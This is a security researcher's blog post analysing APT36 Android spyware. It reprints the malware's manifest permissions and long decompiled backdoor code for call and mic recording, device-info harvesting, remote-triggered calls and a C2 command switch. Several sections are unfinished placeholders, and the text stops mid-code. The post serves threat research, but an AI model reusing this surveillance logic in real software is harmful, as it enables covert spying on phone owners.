<!doctype html>
<!--
'ello;

````````````````````````````````````````````````````````````````
````````````````````````````:'+##+',````````````````````````````
````````````````````````:##############.````````````````####````
``````````````````````+##################:````````````,#####+```
````````````````````'######################,``````````#######```
```````````````````##+';:::;'+###############````````########```
``````````````````.``` ,'+@###################``````.#######+```
````````````````````+##########################`````+####+.`````
`````````````````,##############################````####````````
````````````````#################################`:'###`````````
``````````````:#######################################:``.,`````
`````````````'#########################################,#####```
````````````,################################################'``
````````````#################################################;``
```````````.###################@########################   ,'```
```````````##############;.``````````,'################,````````
```````````###########.``````````````````;#############`````````
``````````.########+```````````````````````.##########``````````
``````````'#######```````````````````````````:#######.``````````
``````````######+``````````````````````````````######:``````````
``````````######```````````````````````````````.#####'``````````
``````````#####`````````````````````````````````######``````````
``````````####'````++':````````````````` ,'+#.```#####``````````
``````````####.``````;###'````````````:###+``````#####``````````
``````````####```````######:`````````#####+``````'####``````````
``````````####``````#########``````:########`````;####``````````
``````````####`````,########:#````'#########`````;####``````````
``````````#### `````########````````########`````'####``````````
``````````####.``````+####'``````````+####'``````#####``````````
``````````####+````````  `````````````` ````````.#####``````````
``````````#####`````````````````````````````````######``````````
``````````######```````````````````````````````;######``````````
``````````#######`````````````````````````````,#######``````````
``````````########``````````'######.`````````+########``````````
``````````##########,````.###########:`````+##########``````````
``````````,##########################################+``````````
```````````##########################################.``````````
```````````##########################################```````````
````````````########################################.```````````
````````````+#######################################````````````
`````````````######################################`````````````
`````````````,####################################;`````````````
``````````````+###################################``````````````
``````````:````##################################```````````````
``````````#.````################################`````@``````````
``````````##`````##############################`````##``````````
``````````###`````###########################+`````###``````````
``````````####.````#########################.`````####``````````
``````````#####;````:#####################;`````'#####``````````
``````````#######`````##################:``````######'``````````
``````````,#######.`````:+##########+:``````.########```````````
```````````;########``````````````````````;#########````````````
`````````````+########`````,+;,.````.,;##########+,`````````````
```````````````,+#######,`````.'#############+;.````````````````
```````````````````,;#####+, ````` `.,,,,.``````````````````````
```````````````````````` `..,,.`````````````````````````````````
````````````````````````````````````````````````````````````````
-->
<html>
<head>
<meta name="Description" content="Publications by ret2eax, a security researcher, consultant and enthusiast.">
<link rel="stylesheet" href="../Resources/css/hack.css">
<link rel="stylesheet" href="../Resources/css/themes/dark.css">
<title>0x01c: Reversing APT36 Malware Targeting Military & Diplomatic Resources</title>
</head>
<p>
<center><img src="../images/ret_logo.png" width="80"></center><br>
<center>((((λf.(λx.(fx)))(λy.y))(λz.z)))</center>
<p>
<center><< <a href="../index.html">home</a> >></center>
<body class="hack dark">
  <div class="main container">
<h1>0x01c: Reversing APT36 Malware Targeting Military & Diplomatic Resources</h1>
<pre class="hack dark">  _   _     ____
 |'| |'| U /"___|
/| |_| |\\| | u
U|  _  |u | |/__
 |_| |_|   \____|
 //   \\  _// \\
(_") ("_)(__)(__)


#homecrew
@ret2eax

ret2eax@h0m3cr3w:~$ ./content.sh

listing content..

[1.] INTRODUCTION
[2.] PAKISTAN AND INDIA POLITICAL RELATIONS AND TENSIONS
[3.] SIGNALS & IOCs
[4.] ANALYSIS OF SAMPLE X
[5.] ANALYSIS OF SAMPLE Y
[6.] YARRA RULE TO IDENTIFY FUTURE VARIANTS BASED ON SIMILARITIES WITHIN SAMPLE SET
[7.] CONCLUSION

___________________________________________________________________</pre>

<p>#[INTRODUCTION] :</p>

<p><a href="https://malpedia.caad.fkie.fraunhofer.de/actor/operation_c-major">APT36</a>, also referred to as Operation C-Major, PROJECTM, Mythic Leopard, and Transparent Tribe, is a Pakistani government-aligned actor that is a politically motivated <a href="https://www.kaspersky.com/resource-center/definitions/advanced-persistent-threats">Advanced Persistent Threat</a> (APT) group. This APT group has been linked to Pakistan and mainly focuses its resources on targeting Indian Government entities and personnel. The motivation behind these attacks is information theft and espionage to gather intelligence from the Indian government, military, and diplomatic resources.</p>
    
<p>An example of this was unveiled by an investigation in previous years, of which, identified the APT group targeting Windows systems across Indian embassies in Saudi Arabia and Kazakstan, as well as executing campaigns targeting officials of India’s Central Bureau of Investigation (CBI). More prominent, CNN-IBN discovered that Pakistani officials, allegedly Pakistan's ISI (Inter-Services Intelligence) agency was collecting data about Indian troop movements using Android malware disguised as an application called <a href="https://www.firstpost.com/tech/news-analysis/smeshapp-cyberterrorism-is-real-but-what-is-it-and-what-can-we-do-about-it-3678773.html">SmeshApp</a>. At the time (2016), an <a href="https://en.wikipedia.org/wiki/2016_Pathankot_attack">attack</a> by a heavily armed group against the Pathankhot Air Force base (part of the Western Air Command of the Indian Air Force) resulted in at least 6 deaths, and was carried out with a marked degree of foresight and knowledge of the air base and operations. A portion of intelligence gathered for that attack originated from SmeshApp's success and the attack was later claimed by the <a href="https://en.wikipedia.org/wiki/United_Jihad_Council">United Jihad Council</a>, also known as the <a href="https://irp.fas.org/world/para/mjc.htm">Muttahida Jihad Council</a>, an Islamist Jihadist organisation formed by the Pakistan Army for unified command and control over the anti-Indian militant groups operating in the Jammu and Kashmir province (which has been the subject of a dispute between India, Pakistan and China since the mid-20th century). While an outdated example, such campaigns from APT36 continue and are prominent today. This publication is a result of having identified over seventy (70) variants of Android malware with APT36 origins and modus operandi (MO), of which, has actively been used by the group for campaigns across the Android mobile ecosystem, until now. While these malware variants have been identified, new variants with alternative signatures, signals & IoCs that are not yet known continue to be developed by APT36. Another recent notable campaign by this APT group was leveraging deceit through disguising a RAT via a fraudulent national COVID-19 contact tracing application. Further reading can be located <a href="https://www.trendmicro.com/en_us/research/22/a/investigating-apt36-or-earth-karkaddans-attack-chain-and-malware.html">here</a>.</p></p>
    
<p>Typically, the APT group’s arrival and payload delivery methods for Android malware include the use of social engineering through spear-phishing campaigns, alongside other deployment vectors that would execute a remote access trojan (RAT) upon conditional victim interaction.
    
<p>The two malware strains that will be focused on below are backdoors developed by APT36 identified within the wild. These backdoors launched by APT36 permit the ability for the group to execute remote commands from their C2 (command and control) server, allowing; dynamic interception of target phone calls and SMS messages, tracking victim/target GPS location co-ordinates, as well as read, extract and exfiltrate personal identifiable information (PII) from the device, amongst other capabilities.</p>

<p>#[PAKISTAN AND INDIA POLITICAL RELATIONS AND TENSIONS] :</p>

  <p>Go into details here.</p>

  
<p>#[SIGNALS & IOCs] :</p>

<p>Malware analysis across the various samples shows that many of the campaigns and attacks appear related by common signals and IoCs (Indicators of Compromise). These signals and IoCs include, but are not limited to;</p>
      <p>discovered samples are non-sophisticated, no packing or obfuscation and the variants identified contain no native ELF meaning analysis of ARM ASM bins was not neccessary.</p> 
  <p>.. more here ..</p> 

<p>#[ANALYSIS OF SAMPLE X] :</p>

    <p>The following analysis is based on a Android APK malware sample origintating from APT36. This sample has been defined here as sample X, and will be referred to as sample X from this point onwards. During the initial analysis it was identified that this sample had excessive android.permission.* constants defined within the application's manfiest. This permitted the application to leverage access to the relevant Android device functions associated with such constants. In addition to the aforementioned, the manifest details the sample's entry point alongside registered broadcast recievers. These definitions have been outlined within the sample's manifest below:</p>
<pre class="hack dark"><i>
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.example.redacted.redacted&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2438415&quot;&gt;
  &lt;uses-sdk android:minSdkVersion=&quot;13&quot; android:targetSdkVersion=&quot;21&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.CHANGE_WIFI_MULTICAST_STATE&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.PROCESS_OUTGOING_CALLS&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.CAMERA&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.VIBRATE&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.READ_CALL_LOG&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.CLEAR_APP_CACHE&quot;/&gt;
  &lt;uses-permission android:name=&quot;android.permission.READ_INSTALL_SESSIONS&quot;/&gt;
  &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;false&quot;&gt;
    &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;com.example.redcated.redacted.MainActivity&quot;&gt;
      &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;
        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;
      &lt;/intent-filter&gt;
    &lt;/activity&gt;
    &lt;service android:name=&quot;com.example.redacted.redacted.CMDService&quot;&gt;
      &lt;action android:name=&quot;.CMDService&quot;/&gt;
    &lt;/service&gt;
    &lt;receiver android:name=&quot;com.example.redacted.redacted.BootUpReceiver&quot;&gt;
      &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
        &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
      &lt;/intent-filter&gt;
    &lt;/receiver&gt;
    &lt;receiver android:name=&quot;com.example.redacted.redacted.SMSMonitor&quot; android:exported=&quot;true&quot;&gt;
      &lt;intent-filter android:priority=&quot;999&quot;&gt;
        &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot;/&gt;
      &lt;/intent-filter&gt;
    &lt;/receiver&gt;
    &lt;receiver android:name=&quot;com.example.redacted.redacted.CallMonitor&quot;&gt;
      &lt;intent-filter&gt;
        &lt;action android:name=&quot;android.intent.action.PHONE_STATE&quot;/&gt;
      &lt;/intent-filter&gt;
    &lt;/receiver&gt;
  &lt;/application&gt;
&lt;/manifest&gt;
</i>
</pre>

    <p>The above defnies the following Android device permission constants (android.permission.*):</p>
    
       <pre class="hack dark"><i>
.ACCESS_NETWORK_STATE                [ACCESS NETWORK INFORMATION, Wi-Fi, GSM, GPRS, UMTS ETC]
.WRITE_EXTERNAL_STORAGE              [WRITE TO DEVICE EXTERNAL STORAGE] 
.ACCESS_WIFI_STATE.                  [ACCESS WIFI NETWORK INFORMATION]
.ACCESS_COARSE_LOCATION              [ACCESS APPROXIMATE LOCATION]
.RECEIVE_BOOT_COMPLETED              [RECEIVE THE `ACTION_BOOT_COMPLETED` INTENT] 
.CHANGE_WIFI_MULTICAST_STATE         [WIFI MULTICAST MODE]
.INTERNET                            [NETWORK OPERATIONS] 
.ACCESS_FINE_LOCATION.               [ACCESS PRECISE LOCATION, GETLAT/GETLONG X,Y CO-ORDINATES] 
.RECEIVE_SMS                         [RECEIVE INBOUND SMS MESSAGES]
.READ_SMS                            [READ DEVICE SMS STORE]
.SEND_SMS                            [INTERACT W/ SMS MANAGER API TO SEMD TEXT & PDU SMS MESSAGES]
.READ_PHONE_STATE                    [READ ACCESS TO CELLULAR NETWORK INFO, STATUS OF ONGOING CALLS ETC] 
.PROCESS_OUTGOING_CALLS              [IDENTIFY NUMBER DURING OUTBOUND CALL, REDIRECT OR ABORT THE CALL] 
.RECORD_AUDIO                        [ACCESS DEVICE MICROPHONE TO RECORD AUDIO]
.CAMERA                              [ACCESS TO THE DEVICE'S CAMERA
.CALL_PHONE                          [INITIATE PHONE CALL WITHOUT UI DIALER OR CONFIRMATION FROM OWNER]  
.READ_CONTACTS                       [INTERACT W/ CONTACTSCONTRACT API TO READ DEVICE CONTACTS]
.VIBRATE                             [ACCESS TO THE DEVICE DC MOTOR THAT CREATES VIBRATION]
.READ_CALL_LOG                       [READ DEVICE OWNER'S CALL LOG]
.CLEAR_APP_CACHE                     [CLEAR CACHE OF ALL INSTALLED APKs]
</i>
</pre>
    
    <p>The sample's entry point is defined within the manifest via the `android.intent.action.MAIN` Intent:</p>
    
           <pre class="hack dark"><i>
android.intent.action.MAIN on com.example.redcated.redacted.MainActivity
</i>
</pre>
    
    <p>The sample's manifest defines the registered device broadcast recievers to be used for malicious intent:</p>
    
           <pre class="hack dark"><i>
android.intent.action.BOOT_COMPLETED         [ON BOOT COMPLETE EVENT USED FOR MALWARE PERSISTENCE]
android.provider.Telephony.SMS_RECEIVED      [RECEIVER FOR DEVICE SMS MONITORING]
android.intent.action.PHONE_STATE.           [RECEIVER FOR DEVICE PHONE CALL MONITORING]
</i>
</pre>
    
    <p>After decompiling the sample's DEX (Dalvik bytecode), SMALi/baksmali to readable JAVA/Kotlin classes; the entry point, being, the `MainActivity` class defined by `android.intent.action.MAIN` is seen to contain an `onCreate()` method invoking another class, being `CMDService` class, of which, is also invoked via the `onResume()` and `onStart()` method within the same `MainActivity` class. The following represents the `onCreate()` method which is immediatley called by Android's javac/kotlinc compiler and executed on the JVM: 
      
          <pre class="hack dark"><i>
  protected void onCreate(android.os.Bundle p9) {
    super.onCreate(p9);
    Maybe([ARRAY, OBJECT]) v7_0 = new android.content.Intent(v3_1);
    Maybe([ARRAY, OBJECT]) v3_2 = v7_0;
    v7_0.<init>(this.getBaseContext(), com.example.redacted.redacted.CMDService.class);
    this.startService(v3_2);
    return;
  }
</i>
</pre>
      
      Following the callback to the `CMDService` class defined within the above `onCreate()` method, we can see the sample defines Command and Control (C2) capabilities as well as instantiates programmatic `IF/ELSE`, `CASE/SWITCH` conditional statement for C2 flow. These C2 clauses execute depending on the input recieved by the remote C2 server that in the control of APT36. Note; the below class has been truncated for brevity, while still highlighting a portion of the sample's backdoor capabilities:</p>

    <pre class="hack dark"><i>
  public constructor com.example.redacted.redacted.CMDService() {
    Maybe([ARRAY, OBJECT]) v5_0 = new com.example.redacted.redacted.fileUpload(v2_0);
    Maybe([ARRAY, OBJECT]) v2_1 = v5_0;
    v5_0.<init>();
    this.upload = v2_1;
    Maybe([ARRAY, OBJECT]) v5_1 = new com.example.redacted.redacted.update(v2_2);
    Maybe([ARRAY, OBJECT]) v2_3 = v5_1;
    v5_1.<init>();
    this.newUp = v2_3;
    Maybe([ARRAY, OBJECT]) v5_2 = new com.example.redacted.redacted.CMDService$2(v2_4);
    Maybe([ARRAY, OBJECT]) v2_5 = v5_2;
    v5_2.<init>(this);
    this.toastHandler = v2_5;
    return;
  }

  private void callRecording() {
    try {
      if (this.callRec == null) {
        this.t_manager = ((android.telephony.TelephonyManager)this.getSystemService("phone"));
        Maybe([ARRAY, OBJECT]) v6_0 = new com.example.redacted.redacted.CMDService$1(v3_3);
        Maybe([ARRAY, OBJECT]) v3_4 = v6_0;
        v6_0.<init>(this);
        this.p_listener = v3_4;
        this.t_manager.listen(this.p_listener, 32);
      } else {
        this.callRec.stop();
      }
    } catch (Exception v2_2) {
    }
    return;
  }

  private boolean isConnected() {
    Type(UNKNOWN) v3_8;
    Maybe([ARRAY, OBJECT]) v2_0 = ((android.net.ConnectivityManager)this.getSystemService("connectivity")).getActiveNetworkInfo();
    if ((v2_0 == null) || (!v2_0.isConnected())) {
      v3_8 = 0;
    } else {
      v3_8 = 1;
    }
    return v3_8;
  }

  private void micRecording() {
    try {
      com.example.redacted.redacted.setting.setRecType(1);
    } catch (Exception v2_3) {
      return;
    }
    if (this.audio != null) {
      this.audio.stop();
    }
    Maybe([ARRAY, OBJECT]) v5_0 = new com.example.redacted.redacted.AudioStreamer(v3_0);
    Maybe([ARRAY, OBJECT]) v3_1 = v5_0;
    v5_0.<init>();
    this.audio = v3_1;
    this.audio.run();
    return;
  }

  private org.json.JSONObject putInfo() {
    try {
      String v4_24;
      android.content.Context v2_1 = this.ctx;
      android.content.BroadcastReceiver v3_2 = this.info.batteryInfoReceiver;
      Maybe([ARRAY, OBJECT]) v7_0 = new android.content.IntentFilter(v4_0);
      Maybe([ARRAY, OBJECT]) v4_1 = v7_0;
      v7_0.<init>("android.intent.action.BATTERY_CHANGED");
      v2_1.registerReceiver(v3_2, v4_1);
      Maybe([ARRAY, OBJECT]) v7_1 = new org.json.JSONObject(v2_2);
      Maybe([ARRAY, OBJECT]) v2_3 = v7_1;
      v7_1.<init>();
      Maybe([ARRAY, OBJECT]) v1_0 = v2_3;
      com.example.redacted.redacted.setting.os = this.info.androidInfo();
      com.example.redacted.redacted.setting.ip = this.info.getIP();
      com.example.redacted.redacted.setting.imi = this.info.getIMEI();
      v1_0.put("CMD", "info");
      v1_0.put("CountryCode", this.info.getCountryCode());
      v1_0.put("name", this.info.getOperatorName());
      v1_0.put("phoneNumber", this.info.getPhoneNumber());
      v1_0.put("simCountryCode", this.info.getSimCountryCode());
      v1_0.put("simSerial", this.info.getSimSerial());
    } catch (Exception v2_20) {
      Maybe([ARRAY, OBJECT]) v1_1 = v2_20;
      if (com.example.redacted.redacted.setting.errors) {
        android.content.Context v2_23 = this.getBaseContext();
        Maybe([ARRAY, OBJECT]) v7_2 = new StringBuilder(v3_11);
        Maybe([ARRAY, OBJECT]) v3_12 = v7_2;
        v7_2.<init>();
        android.widget.Toast.makeText(v2_23, v3_12.append("Exception: ").append(v1_1.getMessage()).toString(), 1).show();
      }
      Maybe([ARRAY, OBJECT]) v0_1 = 0;
      return v0_1;
    }
    if (!com.example.redacted.redacted.setting.isNetworkEnabled) {
      v4_24 = "false";
    } else {
      v4_24 = "true";
    }
    String v4_26;
    v1_0.put("posnetwork", v4_24);
    if (!com.example.redacted.redacted.setting.isGPSEnabled) {
      v4_26 = "false";
    } else {
      v4_26 = "true";
    }
    String v4_28;
    v1_0.put("posgps", v4_26);
    if (!com.example.redacted.redacted.setting.recMic) {
      v4_28 = "false";
    } else {
      v4_28 = "true";
    }
    String v4_30;
    v1_0.put("recMic", v4_28);
    if (!com.example.redacted.redacted.setting.recCall) {
      v4_30 = "false";
    } else {
      v4_30 = "true";
    }
    v1_0.put("recCall", v4_30);
    v1_0.put("smsMoniterUp", com.example.redacted.redacted.setting.smsMoniterUp);
    v1_0.put("smsMoniterDw", com.example.redacted.redacted.setting.smsMoniterDw);
    v1_0.put("smsWhere", com.example.redacted.redacted.setting.smsWhere);
    v1_0.put("callMoniterUp", com.example.redacted.redacted.setting.callMoniterUp);
    v1_0.put("callMoniterDw", com.example.redacted.redacted.setting.callMoniterDw);
    v1_0.put("callWhere", com.example.redacted.redacted.setting.callWhere);
    v1_0.put("capPath", com.example.redacted.redacted.setting.capPath);
    v1_0.put("recPath", com.example.redacted.redacted.setting.recPath);
    v1_0.put("simSerial", this.info.getSimSerial());
    v1_0.put("health", this.info.health);
    v1_0.put("level", this.info.level);
    v1_0.put("plugged", this.info.plugged);
    v1_0.put("present", this.info.present);
    v1_0.put("scale", this.info.scale);
    v1_0.put("status", this.info.status);
    v1_0.put("technology", this.info.technology);
    v1_0.put("temperature", this.info.temperature);
    v1_0.put("voltage", this.info.voltage);
    v1_0.put("dirpath", android.os.Environment.getExternalStorageDirectory());
    v1_0.put("version", com.example.redacted.redacted.setting.verion);
    v1_0.put("network", this.info.networkInfo());
    v1_0.put("simOperatorCode", this.info.getSimOperatorCode());
    v1_0.put("CID", "0");
    v0_1 = v1_0;
    return v0_1;
  }

  private void startService() {
    try {
      if (!com.example.redacted.redacted.setting.recMic) {
        if (com.example.redacted.redacted.setting.recCall) {
          this.callRecording();
        }
      } else {
        this.micRecording();
      }
    } catch (Exception v2_1) {
    }
    Maybe([ARRAY, OBJECT]) v8_0 = new com.example.redacted.redacted.CMDService$mainTask(v3_0);
    Maybe([ARRAY, OBJECT]) v3_1 = v8_0;
    v8_0.<init>(this, 0);
    com.example.redacted.redacted.CMDService.timer.scheduleAtFixedRate(v3_1, ((long)com.example.redacted.redacted.setting.timerDelay), ((long)com.example.redacted.redacted.setting.timerStart));
    return;
  }

  private void stopMic() {
    try {
      com.example.redacted.redacted.setting.recMic = 0;
    } catch (Exception v2_3) {
      return;
    }
    if (this.audio == null) {
      return;
    } else {
      this.audio.stoped = 1;
      this.audio.stop();
      return;
    }
  }

  private void stopRecording() {
    try {
      if (this.callRec == null) {
        this.t_manager.listen(this.p_listener, 0);
      } else {
        this.callRec.stop();
      }
    } catch (Exception v2_2) {
    }
    return;
  }

  public void gaveCall(org.json.JSONObject p11, String p12) {
    try {
      if (p11.getJSONObject("header").has("WHE")) {
        Maybe([ARRAY, OBJECT]) v9_0 = new StringBuilder(v4_5);
        Maybe([ARRAY, OBJECT]) v4_6 = v9_0;
        v9_0.<init>();
        Maybe([ARRAY, OBJECT]) v9_1 = new android.content.Intent(v5_8);
        Maybe([ARRAY, OBJECT]) v5_9 = v9_1;
        v9_1.<init>("android.intent.action.CALL", android.net.Uri.parse(v4_6.append("tel:").append(p11.getJSONObject("header").getString("WHE")).toString()));
        this.intent = v5_9;
        this.intent.setFlags(268435456);
        this.startActivity(this.intent);
        this.updateStatus(p12, "3");
      }
    } catch (Exception v4_3) {
      this.updateStatus(p12, "-1");
    }
    return;
  }

  public android.os.IBinder onBind(android.content.Intent p4) {
    return 0;
  }

  public void onCreate() {
    super.onCreate();
    this.ctx = this;
    Maybe([ARRAY, OBJECT]) v6_0 = new com.example.redacted.redacted.SystemInfo(v2_1);
    Maybe([ARRAY, OBJECT]) v2_2 = v6_0;
    v6_0.<init>(this.ctx);
    this.info = v2_2;
    android.content.Context v1_4 = this.ctx;
    android.content.BroadcastReceiver v2_5 = this.info.batteryInfoReceiver;
    Maybe([ARRAY, OBJECT]) v6_1 = new android.content.IntentFilter(v3_1);
    Maybe([ARRAY, OBJECT]) v3_2 = v6_1;
    v6_1.<init>("android.intent.action.BATTERY_CHANGED");
    v1_4.registerReceiver(v2_5, v3_2);
    this.startService();
    this.hideApp();
    return;
  }

  public void onDestroy() {
    super.onDestroy();
    if (com.example.redacted.redacted.setting.errors) {
      android.widget.Toast.makeText(this, "Service Stopped", 1).show();
    }
    return;
  }

  public int onStartCommand(android.content.Intent p10, int p11, int p12) {
    Maybe([ARRAY, OBJECT]) v8_0 = new com.example.redacted.redacted.SystemInfo(v5_0);
    Maybe([ARRAY, OBJECT]) v5_1 = v8_0;
    v8_0.<init>(this.ctx);
    this.info = v5_1;
    com.example.redacted.redacted.setting.os = this.info.androidInfo();
    com.example.redacted.redacted.setting.ip = this.info.getIP();
    com.example.redacted.redacted.setting.imi = this.info.getIMEI();
    if (com.example.redacted.redacted.setting.errors) {
      android.widget.Toast.makeText(this, "Service Started", 1).show();
    }
    return 1;
  }

  public void parseJson(String p11) {
    try {
      Maybe([ARRAY, OBJECT]) v9_0 = new org.json.JSONObject(v5_0);
      Maybe([ARRAY, OBJECT]) v5_1 = v9_0;
      v9_0.<init>(p11);
      Maybe([ARRAY, OBJECT]) v2_0 = v5_1;
    } catch (Exception v5_4) {
      Maybe([ARRAY, OBJECT]) v2_1 = v5_4;
      if (!com.example.redacted.redacted.setting.errors) {
        return;
      } else {
        android.content.Context v5_7 = this.getBaseContext();
        Maybe([ARRAY, OBJECT]) v9_1 = new StringBuilder(v6_2);
        Maybe([ARRAY, OBJECT]) v6_3 = v9_1;
        v9_1.<init>();
        android.widget.Toast.makeText(v5_7, v6_3.append("Exception: ").append(v2_1.getMessage()).toString(), 1).show();
        return;
      }
    }
    if (!v2_0.has("header")) {
      return;
    } else {
      if (!v2_0.getJSONObject("header").getString("status").equals("true")) {
        if (!com.example.redacted.redacted.setting.errors) {
          return;
        } else {
          android.content.Context v5_37 = this.getBaseContext();
          Maybe([ARRAY, OBJECT]) v9_3 = new StringBuilder(v6_27);
          Maybe([ARRAY, OBJECT]) v6_28 = v9_3;
          v9_3.<init>();
          android.widget.Toast.makeText(v5_37, v6_28.append("CMD Error: ").append(v2_0.getJSONObject("header").getString("error")).toString(), 1).show();
          return;
        }
      } else {
        if ((!v2_0.getJSONObject("header").has("CMD")) || (v2_0.getJSONObject("header").getString("CMD").equals("ping"))) {
          return;
        } else {
          Maybe([ARRAY, OBJECT]) v4_0 = "0";
          if (v2_0.getJSONObject("header").has("CID")) {
            v4_0 = v2_0.getJSONObject("header").getString("CID");
          }
          this.processCMD(v2_0.getJSONObject("header").getString("CMD"), v4_0, v2_0);
          if (!com.example.redacted.redacted.setting.errors) {
            return;
          } else {
            android.content.Context v5_33 = this.getBaseContext();
            Maybe([ARRAY, OBJECT]) v9_2 = new StringBuilder(v6_22);
            Maybe([ARRAY, OBJECT]) v6_23 = v9_2;
            v9_2.<init>();
            android.widget.Toast.makeText(v5_33, v6_23.append("Other: ").append(v2_0.getJSONObject("header").getString("CMD")).toString(), 1).show();
            return;
          }
        }
      }
    }
  }

  public void processCMD(String p28, String p29, org.json.JSONObject p30) {
    try {
      Type(UNKNOWN) v6_0 = this.isConnected();
    } catch (Exception v21_264) {
      Maybe([ARRAY, OBJECT]) v6_1 = v21_264;
      if (!com.example.redacted.redacted.setting.errors) {
        return;
      } else {
        android.content.Context v21_267 = this.getBaseContext();
        Maybe([ARRAY, OBJECT]) v26_31 = new StringBuilder(v22_141);
        Maybe([ARRAY, OBJECT]) v22_142 = v26_31;
        v26_31.<init>();
        android.widget.Toast.makeText(v21_267, v22_142.append("Exception: ").append(v6_1.getMessage()).toString(), 1).show();
        return;
      }
    }
    if (v6_0 == null) {
      if ((!com.example.redacted.redacted.setting.errors) || (v6_0 != null)) {
        return;
      } else {
        android.widget.Toast.makeText(this.getBaseContext(), "No Internet", 1).show();
        return;
      }
    } else {
      Maybe([ARRAY, OBJECT]) v7_0 = "";
      if (p30.getJSONObject("header").has("WHE")) {
        v7_0 = p30.getJSONObject("header").getString("WHE");
      }
      if (p30.getJSONObject("header").has("VAL")) {
        p30.getJSONObject("header").getString("VAL");
      }
      if (com.example.redacted.redacted.setting.errors) {
        android.content.Context v21_19 = this.getApplicationContext();
        Maybe([ARRAY, OBJECT]) v26_0 = new StringBuilder(v22_8);
        Maybe([ARRAY, OBJECT]) v22_9 = v26_0;
        v26_0.<init>();
        android.widget.Toast.makeText(v21_19, v22_9.append("processing...command: ").append(p28).toString(), 0).show();
      }
      Maybe([ARRAY, OBJECT]) v26_1 = new org.json.JSONObject(v22_13);
      Maybe([ARRAY, OBJECT]) v22_14 = v26_1;
      v26_1.<init>();
      this.json = v22_14;
      Type(UNKNOWN) v10_0 = -1;
      switch (p28.hashCode()) {
        case -2081149304: {
          if (!p28.equals("smslogs")) {
          } else {
            v10_0 = 14;
          }
        }
        case -2080935717: {
          if (!p28.equals("smsstop")) {
          } else {
            v10_0 = 8;
          }
          break;
        }
        case -1949226856: {
          if (!p28.equals("updateApp")) {
          } else {
            v10_0 = 18;
          }
          break;
        }
        case -1884090038: {
          if (!p28.equals("showtoast")) {
          } else {
            v10_0 = 27;
          }
          break;
        }
        case -1586980162: {
          if (!p28.equals("capscreen")) {
          } else {
            v10_0 = 12;
          }
          break;
        }
        case -1511056665: {
          if (!p28.equals("gavecall")) {
          } else {
            v10_0 = 28;
          }
          break;
        }
        case -1494966503: {
          if (!p28.equals("callmoniterdw")) {
          } else {
            v10_0 = 7;
          }
          break;
        }
        case -1494965983: {
          if (!p28.equals("callmoniterup")) {
          } else {
            v10_0 = 6;
          }
          break;
        }
        case -1242790650: {
          if (!p28.equals("frontcam")) {
          } else {
            v10_0 = 22;
          }
          break;
        }
        case -1097488054: {
          if (!p28.equals("locGPS")) {
          } else {
            v10_0 = 32;
          }
          break;
        }
        case -841778170: {
          if (!p28.equals("callmoniter")) {
          } else {
            v10_0 = 5;
          }
          break;
        }
        case -838846263: {
          if (!p28.equals("update")) {
          } else {
            v10_0 = 17;
          }
          break;
        }
        case -838595071: {
          if (!p28.equals("upload")) {
          } else {
            v10_0 = 20;
          }
          break;
        }
        case -838527722: {
          if (!p28.equals("locnetwok")) {
          } else {
            v10_0 = 31;
          }
          break;
        }
        case -772212565: {
          if (!p28.equals("smsmoniter")) {
          } else {
            v10_0 = 9;
          }
          break;
        }
        case -756665192: {
          if (!p28.equals("dirlister")) {
          } else {
            v10_0 = 25;
          }
          break;
        }
        case -682097870: {
          if (!p28.equals("locstatus")) {
          } else {
            v10_0 = 30;
          }
          break;
        }
        case -632298035: {
          if (!p28.equals("conlister")) {
          } else {
            v10_0 = 24;
          }
          break;
        }
        case -347210360: {
          if (!p28.equals("backcam")) {
          } else {
            v10_0 = 21;
          }
          break;
        }
        case -309518737: {
          if (!p28.equals("process")) {
          } else {
            v10_0 = 33;
          }
          break;
        }
        case -171908851: {
          if (!p28.equals("calllogs")) {
          } else {
            v10_0 = 23;
          }
          break;
        }
        case -171695264: {
          if (!p28.equals("callstop")) {
          } else {
            v10_0 = 4;
          }
          break;
        }
        case 3237038: {
          if (!p28.equals("info")) {
          } else {
            v10_0 = 16;
          }
          break;
        }
        case 3441010: {
          if (!p28.equals("ping")) {
          } else {
